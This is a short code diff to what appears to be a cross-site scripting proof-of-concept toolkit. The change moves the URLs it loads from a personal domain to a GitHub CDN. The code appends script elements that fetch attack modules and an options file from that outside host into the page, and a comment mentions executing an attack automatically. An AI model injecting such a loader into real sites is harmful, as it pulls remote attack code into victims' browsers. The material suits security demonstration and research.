@@ -47,7 +47,7 @@ s.addoption = function(t, f) {
                 };
             })(f);
             var script = document.createElement("script");
-            script.src = "//jacobriggs.io/xss-poc/attacks/" + f + ".js";
+            script.src = "https://cdn.jsdelivr.net/gh/JacobRiggs/xss@main/attacks/" + f + ".js";
             document.body.appendChild(script);
             console.log("Script appended:", script.src);
         });
@@ -95,7 +95,7 @@ window.JRSelect = s;
 
 // Include options.js:
 var script = document.createElement("script");
-script.src = "//jacobriggs.io/xss-poc/options.js";
+script.src = "https://cdn.jsdelivr.net/gh/JacobRiggs/xss@main/options.js";
 document.body.appendChild(script);
 
 // Automatically execute an attack if desired.
